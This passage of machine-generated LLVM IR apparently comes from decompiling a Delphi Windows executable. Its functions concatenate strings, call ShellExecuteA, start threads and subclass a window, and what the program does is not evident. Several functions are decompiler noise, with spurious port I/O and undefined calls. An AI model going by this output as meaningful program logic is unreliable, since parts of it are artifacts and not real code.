  store i32 ptrtoint ([6 x i8]* @global_var_4057a4 to i32), i32* %34, align 4, !insn.addr !886
  %35 = call i32 @function_405610(), !insn.addr !887
  %36 = add i32 %esp.0.reload, -44, !insn.addr !888
  %37 = inttoptr i32 %36 to i32*, !insn.addr !888
  %38 = add i32 %esp.0.reload, -48, !insn.addr !889
  %39 = inttoptr i32 %38 to i32*, !insn.addr !889
  store i32 ptrtoint (i32* @global_var_4057b4 to i32), i32* %39, align 4, !insn.addr !889
  %40 = load i32, i32* %stack_var_-16, align 4, !insn.addr !890
  %41 = add i32 %esp.0.reload, -52, !insn.addr !890
  %42 = inttoptr i32 %41 to i32*, !insn.addr !890
  store i32 %40, i32* %42, align 4, !insn.addr !890
  %43 = call i32 @"@LStrCatN"(), !insn.addr !891
  %44 = add i32 %esp.0.reload, -56, !insn.addr !892
  %45 = inttoptr i32 %44 to i32*, !insn.addr !892
  store i32 0, i32* %45, align 4, !insn.addr !892
  %46 = add i32 %esp.0.reload, -60, !insn.addr !893
  %47 = inttoptr i32 %46 to i32*, !insn.addr !893
  store i32 0, i32* %47, align 4, !insn.addr !893
  %48 = call i32 @"@LStrCat3"(), !insn.addr !894
  %49 = call i32 @function_4036c8(), !insn.addr !895
  %50 = add i32 %esp.0.reload, -64, !insn.addr !896
  %51 = inttoptr i32 %50 to i32*, !insn.addr !896
  store i32 %49, i32* %51, align 4, !insn.addr !896
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !897
  %53 = call i32 @function_405574(), !insn.addr !898
  %54 = call i32 @function_4036c8(), !insn.addr !899
  %55 = add i32 %esp.0.reload, -68, !insn.addr !900
  %56 = inttoptr i32 %55 to i32*, !insn.addr !900
  store i32 %54, i32* %56, align 4, !insn.addr !900
  %57 = add i32 %esp.0.reload, -72, !insn.addr !901
  %58 = inttoptr i32 %57 to i32*, !insn.addr !901
  store i32 0, i32* %58, align 4, !insn.addr !901
  %59 = call i32 @function_40556c(), !insn.addr !902
  %60 = add i32 %esp.0.reload, -76, !insn.addr !903
  %61 = inttoptr i32 %60 to i32*, !insn.addr !903
  store i32 1, i32* %61, align 4, !insn.addr !903
  %62 = add i32 %esp.0.reload, -80, !insn.addr !904
  %63 = inttoptr i32 %62 to i32*, !insn.addr !904
  store i32 0, i32* %63, align 4, !insn.addr !904
  %64 = add i32 %esp.0.reload, -84, !insn.addr !905
  %65 = inttoptr i32 %64 to i32*, !insn.addr !905
  store i32 0, i32* %65, align 4, !insn.addr !905
  %66 = call i32 @"@LStrCat3"(), !insn.addr !906
  %67 = call i32 @function_4036c8(), !insn.addr !907
  %68 = add i32 %esp.0.reload, -88, !insn.addr !908
  %69 = inttoptr i32 %68 to i32*, !insn.addr !908
  store i32 %67, i32* %69, align 4, !insn.addr !908
  %70 = add i32 %esp.0.reload, -92, !insn.addr !909
  %71 = inttoptr i32 %70 to i32*, !insn.addr !909
  store i32 ptrtoint ([5 x i8]* @global_var_4057c4 to i32), i32* %71, align 4, !insn.addr !909
  %72 = add i32 %esp.0.reload, -96, !insn.addr !910
  %73 = inttoptr i32 %72 to i32*, !insn.addr !910
  store i32 0, i32* %73, align 4, !insn.addr !910
  %74 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !911
  %75 = load i32, i32* %73, align 4, !insn.addr !912
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !913
  store i32 4216726, i32* %69, align 4, !insn.addr !914
  %76 = call i32 @"@LStrArrayClr"(), !insn.addr !915
  ret i32 %76, !insn.addr !916
}

define i32 @function_40578f() local_unnamed_addr {
dec_label_pc_40578f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !917
  ret i32 %0, !insn.addr !917
}

define i32 @function_405794() local_unnamed_addr {
dec_label_pc_405794:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !918
}

define i32 @function_405796(i32 %arg1) local_unnamed_addr {
dec_label_pc_405796:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !919
}

define i32 @function_4057bb(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4057bb:
  %esp.1.reg2mem = alloca i32, !insn.addr !920
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !920
  %ecx.0.reg2mem = alloca i32, !insn.addr !920
  %esp.0.reg2mem = alloca i32, !insn.addr !920
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %5 = add i32 %2, 1, !insn.addr !920
  %6 = inttoptr i32 %2 to i32*, !insn.addr !920
  store i32 %5, i32* %6, align 4, !insn.addr !920
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !921
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !921
  %11 = add i8 %8, %10, !insn.addr !921
  %12 = inttoptr i32 %9 to i8*, !insn.addr !921
  store i8 %11, i8* %12, align 1, !insn.addr !921
  %13 = add i32 %2, 58, !insn.addr !922
  %14 = inttoptr i32 %13 to i8*, !insn.addr !922
  %15 = load i8, i8* %14, align 1, !insn.addr !922
  %16 = load i32, i32* %eax, align 4, !insn.addr !922
  %17 = udiv i32 %16, 256, !insn.addr !922
  %18 = trunc i32 %17 to i8, !insn.addr !922
  %19 = add i8 %15, %18, !insn.addr !922
  store i8 %19, i8* %14, align 1, !insn.addr !922
  %20 = add i32 %0, 112, !insn.addr !923
  %21 = inttoptr i32 %20 to i8*, !insn.addr !923
  %22 = load i8, i8* %21, align 1, !insn.addr !923
  %23 = trunc i32 %4 to i8, !insn.addr !923
  %24 = add i8 %22, %23, !insn.addr !923
  store i8 %24, i8* %21, align 1, !insn.addr !923
  %25 = trunc i32 %3 to i16, !insn.addr !924
  %26 = call i8 @__readgsbyte(i32 %1), !insn.addr !924
  call void @__asm_outsb(i16 %25, i8 %26), !insn.addr !924
  %27 = load i8, i8* %7, align 4, !insn.addr !925
  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !925
  %30 = add i8 %27, %29, !insn.addr !925
  %31 = inttoptr i32 %28 to i8*, !insn.addr !925
  store i8 %30, i8* %31, align 1, !insn.addr !925
  %32 = load i8, i8* %7, align 4, !insn.addr !926
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !926
  %35 = add i8 %32, %34, !insn.addr !926
  %36 = inttoptr i32 %33 to i8*, !insn.addr !926
  store i8 %35, i8* %36, align 1, !insn.addr !926
  %37 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !927
  store i32 %37, i32* %esp.0.reg2mem, !insn.addr !928
  store i32 10, i32* %ecx.0.reg2mem, !insn.addr !928
  br label %dec_label_pc_4057d4, !insn.addr !928

dec_label_pc_4057d4:                              ; preds = %dec_label_pc_4057d4, %dec_label_pc_4057bb
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %38 = add i32 %esp.0.reload, -4, !insn.addr !929
  %39 = inttoptr i32 %38 to i32*, !insn.addr !929
  store i32 0, i32* %39, align 4, !insn.addr !929
  %40 = add i32 %esp.0.reload, -8, !insn.addr !930
  %41 = inttoptr i32 %40 to i32*, !insn.addr !930
  store i32 0, i32* %41, align 4, !insn.addr !930
  %42 = add nsw i32 %ecx.0.reload, -1, !insn.addr !931
  %43 = icmp eq i32 %42, 0, !insn.addr !931
  %44 = icmp eq i1 %43, false, !insn.addr !932
  store i32 %40, i32* %esp.0.reg2mem, !insn.addr !932
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !932
  br i1 %44, label %dec_label_pc_4057d4, label %dec_label_pc_4057db, !insn.addr !932

dec_label_pc_4057db:                              ; preds = %dec_label_pc_4057d4
  %45 = add i32 %esp.0.reload, -16, !insn.addr !933
  %46 = inttoptr i32 %45 to i32*, !insn.addr !933
  store i32 %37, i32* %46, align 4, !insn.addr !933
  %47 = add i32 %esp.0.reload, -20, !insn.addr !934
  %48 = inttoptr i32 %47 to i32*, !insn.addr !934
  store i32 4217309, i32* %48, align 4, !insn.addr !934
  %49 = call i32 @__readfsdword(i32 0), !insn.addr !935
  %50 = add i32 %esp.0.reload, -24, !insn.addr !935
  %51 = inttoptr i32 %50 to i32*, !insn.addr !935
  store i32 %49, i32* %51, align 4, !insn.addr !935
  call void @__writefsdword(i32 0, i32 %50), !insn.addr !936
  %52 = call i32 @"@LStrPos"(), !insn.addr !937
  %53 = add i32 %esp.0.reload, -28, !insn.addr !938
  %54 = inttoptr i32 %53 to i32*, !insn.addr !938
  %55 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !938
  store i32 %55, i32* %54, align 4, !insn.addr !938
  %56 = call i32 @"@LStrCopy"(), !insn.addr !939
  %57 = add i32 %esp.0.reload, -32, !insn.addr !940
  %58 = inttoptr i32 %57 to i32*
  %59 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !940
  store i32 %59, i32* %58, align 4, !insn.addr !940
  %60 = call i32 @function_4034c8(), !insn.addr !941
  %61 = call i32 @"@LStrCopy"(), !insn.addr !942
  %62 = add i32 %arg1, -1, !insn.addr !943
  store i32 %62, i32* %eax, align 4, !insn.addr !943
  store i32* %58, i32** %.pre-phi.reg2mem
  store i32 %57, i32* %esp.1.reg2mem
  switch i32 %arg1, label %dec_label_pc_4059c2 [
    i32 0, label %dec_label_pc_40584c
    i32 1, label %dec_label_pc_40594d
    i32 2, label %dec_label_pc_4059b7
  ]

dec_label_pc_40584c:                              ; preds = %dec_label_pc_4057db
  %63 = call i32 @function_4034c8(), !insn.addr !944
  %64 = icmp slt i32 %63, 5, !insn.addr !945
  store i32* %58, i32** %.pre-phi.reg2mem, !insn.addr !945
  store i32 %57, i32* %esp.1.reg2mem, !insn.addr !945
  br i1 %64, label %dec_label_pc_4059c2, label %dec_label_pc_40585d, !insn.addr !945

dec_label_pc_40585d:                              ; preds = %dec_label_pc_40584c
  %65 = call i32 @"@LStrFromPChar"(), !insn.addr !946
  %66 = call i32 @function_405574(), !insn.addr !947
  %67 = add i32 %esp.0.reload, -36, !insn.addr !948
  %68 = inttoptr i32 %67 to i32*, !insn.addr !948
  %69 = call i32 @"@LStrFromPChar"(), !insn.addr !949
  %70 = call i32 @function_405574(), !insn.addr !950
  %71 = add i32 %esp.0.reload, -40, !insn.addr !951
  %72 = inttoptr i32 %71 to i32*, !insn.addr !951
  %73 = load i32, i32* %stack_var_-4, align 4, !insn.addr !952
  %74 = add i32 %esp.0.reload, -44, !insn.addr !952
  %75 = inttoptr i32 %74 to i32*, !insn.addr !952
  store i32 %73, i32* %75, align 4, !insn.addr !952
  %76 = add i32 %esp.0.reload, -48, !insn.addr !953
  %77 = inttoptr i32 %76 to i32*, !insn.addr !953
  store i32 ptrtoint (i32* @global_var_405a00 to i32), i32* %77, align 4, !insn.addr !953
  %78 = load i32, i32* %stack_var_-8, align 4, !insn.addr !954
  %79 = add i32 %esp.0.reload, -52, !insn.addr !954
  %80 = inttoptr i32 %79 to i32*, !insn.addr !954
  store i32 %78, i32* %80, align 4, !insn.addr !954
  %81 = call i32 @"@LStrCatN"(), !insn.addr !955
  %82 = add i32 %esp.0.reload, -56, !insn.addr !956
  %83 = inttoptr i32 %82 to i32*, !insn.addr !956
  %84 = add i32 %esp.0.reload, -60, !insn.addr !957
  %85 = inttoptr i32 %84 to i32*, !insn.addr !957
  store i32 4217356, i32* %85, align 4, !insn.addr !957
  %86 = load i32, i32* %stack_var_-4, align 4, !insn.addr !958
  %87 = add i32 %esp.0.reload, -64, !insn.addr !958
  %88 = inttoptr i32 %87 to i32*, !insn.addr !958
  store i32 %86, i32* %88, align 4, !insn.addr !958
  %89 = add i32 %esp.0.reload, -68, !insn.addr !959
  %90 = inttoptr i32 %89 to i32*, !insn.addr !959
  store i32 4217372, i32* %90, align 4, !insn.addr !959
  %91 = load i32, i32* %stack_var_-8, align 4, !insn.addr !960
  %92 = add i32 %esp.0.reload, -72, !insn.addr !960
  %93 = inttoptr i32 %92 to i32*, !insn.addr !960
  store i32 %91, i32* %93, align 4, !insn.addr !960
  %94 = add i32 %esp.0.reload, -76, !insn.addr !961
  %95 = inttoptr i32 %94 to i32*, !insn.addr !961
  store i32 4217388, i32* %95, align 4, !insn.addr !961
  %96 = call i32 @function_407444(), !insn.addr !962
  %97 = add i32 %esp.0.reload, -80, !insn.addr !963
  %98 = inttoptr i32 %97 to i32*, !insn.addr !963
  %99 = call i32 @"@LStrCatN"(), !insn.addr !964
  %100 = add i32 %esp.0.reload, -84, !insn.addr !965
  %101 = inttoptr i32 %100 to i32*
  %102 = call i32 @"@LStrFromPChar"(), !insn.addr !966
  %103 = call i32 @function_405574(), !insn.addr !967
  %104 = add i32 %esp.0.reload, -88, !insn.addr !968
  %105 = inttoptr i32 %104 to i32*, !insn.addr !968
  %106 = call i32 @"@LStrFromPChar"(), !insn.addr !969
  %107 = call i32 @function_405574(), !insn.addr !970
  %108 = add i32 %esp.0.reload, -92, !insn.addr !971
  %109 = inttoptr i32 %108 to i32*, !insn.addr !971
  %110 = call i32 @"@LStrFromPChar"(), !insn.addr !972
  %111 = call i32 @function_405574(), !insn.addr !973
  %112 = call i32 @function_4051cc(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !974
  store i32* %101, i32** %.pre-phi.reg2mem, !insn.addr !975
  store i32 %100, i32* %esp.1.reg2mem, !insn.addr !975
  br label %dec_label_pc_4059c2, !insn.addr !975

dec_label_pc_40594d:                              ; preds = %dec_label_pc_4057db
  %113 = call i32 @function_4034c8(), !insn.addr !976
  %114 = icmp slt i32 %113, 5, !insn.addr !977
  store i32* %58, i32** %.pre-phi.reg2mem, !insn.addr !977
  store i32 %57, i32* %esp.1.reg2mem, !insn.addr !977
  br i1 %114, label %dec_label_pc_4059c2, label %dec_label_pc_40595a, !insn.addr !977

dec_label_pc_40595a:                              ; preds = %dec_label_pc_40594d
  %115 = add i32 %esp.0.reload, -36, !insn.addr !978
  %116 = inttoptr i32 %115 to i32*, !insn.addr !978
  store i32 ptrtoint ([5 x i8]* @global_var_405a40 to i32), i32* %116, align 4, !insn.addr !978
  %117 = call i32 @function_404b64(), !insn.addr !979
  %118 = add i32 %esp.0.reload, -40, !insn.addr !980
  %119 = inttoptr i32 %118 to i32*, !insn.addr !980
  %120 = add i32 %esp.0.reload, -44, !insn.addr !981
  %121 = inttoptr i32 %120 to i32*, !insn.addr !981
  store i32 ptrtoint ([7 x i8]* @global_var_405a50 to i32), i32* %121, align 4, !insn.addr !981
  %122 = call i32 @function_404b64(), !insn.addr !982
  %123 = add i32 %esp.0.reload, -48, !insn.addr !983
  %124 = inttoptr i32 %123 to i32*
  %125 = call i32 @"@LStrCatN"(), !insn.addr !984
  %126 = add i32 %esp.0.reload, -52, !insn.addr !985
  %127 = inttoptr i32 %126 to i32*, !insn.addr !985
  %128 = call i32 @"@LStrFromPChar"(), !insn.addr !986
  %129 = call i32 @function_405574(), !insn.addr !987
  %130 = call i32 @function_404cbc(), !insn.addr !988
  store i32* %124, i32** %.pre-phi.reg2mem, !insn.addr !989
  store i32 %123, i32* %esp.1.reg2mem, !insn.addr !989
  br label %dec_label_pc_4059c2, !insn.addr !989

dec_label_pc_4059b7:                              ; preds = %dec_label_pc_4057db
  %131 = call i32 @function_4034c8(), !insn.addr !990
  store i32* %58, i32** %.pre-phi.reg2mem, !insn.addr !991
  store i32 %57, i32* %esp.1.reg2mem, !insn.addr !991
  br label %dec_label_pc_4059c2, !insn.addr !991

dec_label_pc_4059c2:                              ; preds = %dec_label_pc_4057db, %dec_label_pc_4059b7, %dec_label_pc_40595a, %dec_label_pc_40594d, %dec_label_pc_40585d, %dec_label_pc_40584c
  %132 = add i32 %esp.0.reload, -12, !insn.addr !992
  %133 = inttoptr i32 %132 to i32*, !insn.addr !992
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %134 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !993
  call void @__writefsdword(i32 0, i32 %134), !insn.addr !994
  %135 = add i32 %esp.1.reload, 8, !insn.addr !995
  %136 = inttoptr i32 %135 to i32*, !insn.addr !995
  store i32 4217316, i32* %136, align 4, !insn.addr !995
  %137 = call i32 @"@LStrArrayClr"(), !insn.addr !996
  ret i32 %137, !insn.addr !997
}

define i32 @function_4059dd() local_unnamed_addr {
dec_label_pc_4059dd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !998
  ret i32 %0, !insn.addr !998
}

define i32 @function_4059e2() local_unnamed_addr {
dec_label_pc_4059e2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !999
}

define i32 @function_4059e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4059e4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1000
}

define i32 @function_405a0f() local_unnamed_addr {
dec_label_pc_405a0f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1001
}

define i32 @function_405a17() local_unnamed_addr {
dec_label_pc_405a17:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1002
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1002
  store i32 %1, i32* %2, align 4, !insn.addr !1002
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1003
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1003
  %7 = add i8 %4, %6, !insn.addr !1003
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1003
  store i8 %7, i8* %8, align 1, !insn.addr !1003
  %9 = load i8, i8* %3, align 4, !insn.addr !1004
  %10 = load i32, i32* %eax, align 4
  %11 = udiv i32 %10, 256, !insn.addr !1004
  %12 = trunc i32 %11 to i8, !insn.addr !1004
  %13 = add i8 %9, %12, !insn.addr !1004
  %14 = inttoptr i32 %10 to i8*, !insn.addr !1004
  store i8 %13, i8* %14, align 1, !insn.addr !1004
  %15 = load i32, i32* %eax, align 4, !insn.addr !1005
  ret i32 %15, !insn.addr !1005
}

define i32 @function_405a1e() local_unnamed_addr {
dec_label_pc_405a1e:
  %0 = call i32 @function_405a5c(), !insn.addr !1006
  ret i32 %0, !insn.addr !1006
}

define i32 @function_405a4b() local_unnamed_addr {
dec_label_pc_405a4b:
  %esi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %2 = add i32 %0, 1, !insn.addr !1007
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1007
  store i32 %2, i32* %3, align 4, !insn.addr !1007
  %4 = bitcast i32* %eax to i8*
  %5 = load i8, i8* %4, align 4, !insn.addr !1008
  %6 = load i32, i32* %eax, align 4
  %7 = trunc i32 %6 to i8, !insn.addr !1008
  %8 = add i8 %5, %7, !insn.addr !1008
  %9 = inttoptr i32 %6 to i8*, !insn.addr !1008
  store i8 %8, i8* %9, align 1, !insn.addr !1008
  %10 = bitcast i32* %esi to i8*
  %11 = load i8, i8* %10, align 4, !insn.addr !1009
  %12 = load i32, i32* %eax, align 4, !insn.addr !1009
  %13 = udiv i32 %12, 256, !insn.addr !1009
  %14 = trunc i32 %13 to i8, !insn.addr !1009
  %15 = add i8 %11, %14, !insn.addr !1009
  %16 = load i32, i32* %esi, align 4, !insn.addr !1009
  %17 = inttoptr i32 %16 to i8*, !insn.addr !1009
  store i8 %15, i8* %17, align 1, !insn.addr !1009
  %18 = trunc i32 %1 to i16, !insn.addr !1010
  %19 = call i8 @__asm_in(i16 %18), !insn.addr !1010
  %20 = sext i8 %19 to i32, !insn.addr !1010
  %21 = load i32, i32* %eax, align 4, !insn.addr !1010
  %22 = and i32 %21, -256, !insn.addr !1010
  %23 = or i32 %22, %20, !insn.addr !1010
  ret i32 %23, !insn.addr !1011
}

define i32 @function_405a5c() local_unnamed_addr {
dec_label_pc_405a5c:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1012
  %.pre-phi.reg2mem = alloca i32, !insn.addr !1012
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %1 = add i32 %0, 12, !insn.addr !1013
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1013
  %3 = load i32, i32* %2, align 4, !insn.addr !1013
  %4 = icmp eq i32 %3, 74, !insn.addr !1014
  %5 = icmp eq i1 %4, false, !insn.addr !1015
  br i1 %5, label %dec_label_pc_405a5c.dec_label_pc_405ab9_crit_edge, label %dec_label_pc_405a65, !insn.addr !1015

dec_label_pc_405a5c.dec_label_pc_405ab9_crit_edge: ; preds = %dec_label_pc_405a5c
  %.pre = add i32 %0, 20, !insn.addr !1016
  store i32 %.pre, i32* %.pre-phi.reg2mem
  store i32* %stack_var_-4, i32** %esp.0.in.reg2mem
  br label %dec_label_pc_405ab9

dec_label_pc_405a65:                              ; preds = %dec_label_pc_405a5c
  %6 = call i32 @"@LStrSetLength"(), !insn.addr !1017
  %7 = call i32 @function_403720(), !insn.addr !1018
  %8 = call i32 @function_4045ac(), !insn.addr !1019
  %9 = add i32 %0, 20
  %10 = inttoptr i32 %9 to %_SECURITY_ATTRIBUTES*, !insn.addr !1020
  %11 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* %10, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4216780 to i32*), i32 0, i32* null), !insn.addr !1021
  store i32 0, i32* %stack_var_-52, align 4, !insn.addr !1022
  %12 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* %10, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4216780 to i32*), i32 0, i32* null), !insn.addr !1023
  store i32 %9, i32* %.pre-phi.reg2mem, !insn.addr !1023
  store i32* %stack_var_-52, i32** %esp.0.in.reg2mem, !insn.addr !1023
  br label %dec_label_pc_405ab9, !insn.addr !1023

dec_label_pc_405ab9:                              ; preds = %dec_label_pc_405a5c.dec_label_pc_405ab9_crit_edge, %dec_label_pc_405a65
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %.pre-phi.reload = load i32, i32* %.pre-phi.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %13 = inttoptr i32 %.pre-phi.reload to i32*, !insn.addr !1016
  %14 = load i32, i32* %13, align 4, !insn.addr !1016
  %15 = add i32 %esp.0, -4, !insn.addr !1024
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1024
  store i32 %14, i32* %16, align 4, !insn.addr !1024
  %17 = add i32 %0, 16, !insn.addr !1025
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1025
  %19 = load i32, i32* %18, align 4, !insn.addr !1025
  %20 = add i32 %esp.0, -8, !insn.addr !1026
  %21 = inttoptr i32 %20 to i32*, !insn.addr !1026
  store i32 %19, i32* %21, align 4, !insn.addr !1026
  %22 = add i32 %esp.0, -12, !insn.addr !1027
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1027
  store i32 %3, i32* %23, align 4, !insn.addr !1027
  %24 = add i32 %0, 8, !insn.addr !1028
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1028
  %26 = load i32, i32* %25, align 4, !insn.addr !1028
  %27 = add i32 %esp.0, -16, !insn.addr !1029
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1029
  store i32 %26, i32* %28, align 4, !insn.addr !1029
  %29 = call i32 @DefWindowProcA(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1030
  ret i32 %29, !insn.addr !1031
}

define i32 @function_405ad4() local_unnamed_addr {
dec_label_pc_405ad4:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = ptrtoint i32 (i32, i32, i32)* %0 to i32
  %2 = call i32* @CreateWindowExA(i32 0, i8* null, i8* null, i32 0, i32 0, i32 0, i32 0, i32 %1, i32* null, i32* nonnull @0, i32* nonnull @0, i32* nonnull @0), !insn.addr !1032
  %3 = ptrtoint i32* %2 to i32, !insn.addr !1032
  %4 = call i32 @SetWindowLongA(i32* inttoptr (i32 4217432 to i32*), i32 -4, i32 %3), !insn.addr !1033
  ret i32 %4, !insn.addr !1034
}

define i32 @function_405b09(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_405b09:
  %esp.0.reg2mem = alloca i32, !insn.addr !1035
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_16 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_16, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg6, i32* %stack_var_4, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1035
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1035
  store i8 %6, i8* %7, align 1, !insn.addr !1035
  %8 = add i32 %4, 114, !insn.addr !1036
  %9 = inttoptr i32 %8 to i8*, !insn.addr !1036
  %10 = load i8, i8* %9, align 1, !insn.addr !1036
  %11 = udiv i32 %3, 256, !insn.addr !1036
  %12 = trunc i32 %11 to i8, !insn.addr !1036
  %13 = add i8 %10, %12, !insn.addr !1036
  store i8 %13, i8* %9, align 1, !insn.addr !1036
  %14 = add i8 %5, -32, !insn.addr !1037
  %15 = icmp ult i8 %5, 32, !insn.addr !1037
  %16 = icmp eq i8 %14, 0, !insn.addr !1037
  %17 = zext i8 %14 to i32, !insn.addr !1037
  %18 = and i32 %4, -256, !insn.addr !1037
  %19 = or i32 %18, %17, !insn.addr !1037
  %20 = or i1 %15, %16, !insn.addr !1038
  br i1 %20, label %dec_label_pc_405b12, label %dec_label_pc_405b81, !insn.addr !1038

dec_label_pc_405b12:                              ; preds = %dec_label_pc_405b09
  %21 = add i32 %19, 105, !insn.addr !1039
  %22 = inttoptr i32 %21 to i8*, !insn.addr !1039
  %23 = load i8, i8* %22, align 1, !insn.addr !1039
  %24 = and i8 %23, %12, !insn.addr !1039
  store i8 %24, i8* %22, align 1, !insn.addr !1039
  %25 = load i32, i32* %stack_var_4, align 4, !insn.addr !1040
  %26 = trunc i32 %arg3 to i16, !insn.addr !1041
  %27 = inttoptr i32 %25 to i8*, !insn.addr !1041
  %28 = load i8, i8* %27, align 1, !insn.addr !1041
  call void @__asm_outsb(i16 %26, i8 %28), !insn.addr !1041
  %29 = add i32 %arg5, 105, !insn.addr !1042
  %30 = and i32 %29, 65535
  %31 = inttoptr i32 %30 to i8*, !insn.addr !1042
  %32 = load i8, i8* %31, align 1, !insn.addr !1042
  %33 = udiv i32 %arg2, 256, !insn.addr !1042
  %34 = trunc i32 %33 to i8, !insn.addr !1042
  %35 = and i8 %32, %34, !insn.addr !1042
  store i8 %35, i8* %31, align 1, !insn.addr !1042
  %36 = mul i32 %arg5, 2, !insn.addr !1043
  %37 = add i32 %arg2, 115, !insn.addr !1043
  %38 = add i32 %37, %36, !insn.addr !1043
  %39 = inttoptr i32 %38 to i8*, !insn.addr !1043
  %40 = load i8, i8* %39, align 1, !insn.addr !1043
  %41 = trunc i32 %arg2 to i8, !insn.addr !1043
  %42 = add i8 %40, %41, !insn.addr !1043
  %43 = icmp eq i8 %42, 0, !insn.addr !1043
  store i8 %42, i8* %39, align 1, !insn.addr !1043
  br i1 %43, label %dec_label_pc_405b63, label %dec_label_pc_405b21, !insn.addr !1044

dec_label_pc_405b21:                              ; preds = %dec_label_pc_405b12
  %44 = inttoptr i32 %25 to i32*, !insn.addr !1045
  %45 = load i32, i32* %44, align 4, !insn.addr !1045
  call void @__asm_outsd(i16 %26, i32 %45), !insn.addr !1045
  %46 = call i32 @__readfsdword(i32 0), !insn.addr !1046
  store i32 %46, i32* %stack_var_16, align 4, !insn.addr !1046
  %47 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1046
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !1047
  %48 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !1048
  %49 = add i32 %48, 1, !insn.addr !1048
  %50 = icmp eq i32 %49, 0, !insn.addr !1048
  store i32 %49, i32* @global_var_4096b0, align 4, !insn.addr !1048
  %51 = icmp eq i1 %50, false, !insn.addr !1049
  br i1 %51, label %dec_label_pc_405b47, label %dec_label_pc_405b3d, !insn.addr !1049

dec_label_pc_405b3d:                              ; preds = %dec_label_pc_405b21
  %52 = call i32 @"@LStrClr"(), !insn.addr !1050
  br label %dec_label_pc_405b47, !insn.addr !1050

dec_label_pc_405b47:                              ; preds = %dec_label_pc_405b3d, %dec_label_pc_405b21
